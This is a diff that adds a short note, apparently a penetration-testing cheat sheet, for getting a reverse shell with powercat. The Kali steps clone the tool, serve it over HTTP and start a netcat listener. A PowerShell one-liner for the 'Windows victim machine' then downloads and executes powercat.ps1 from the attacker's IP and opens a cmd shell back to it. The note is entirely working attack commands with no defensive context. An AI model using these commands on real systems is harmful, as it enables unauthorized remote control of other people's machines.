@@ -1,0 +1,9 @@
+ON KALI:
+git clone https://github.com/besimorhino/powercat.git
+cd powercat/ 
+python -m SimpleHTTPServer 80
+open in another terminal a netcat listener: nc -l -p 443
+
+
+ON WINDOWS VICTIM MACHINE:
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.217.130/powercat.ps1');powercat -c 172.16.217.130 -p 443 -e cmd"
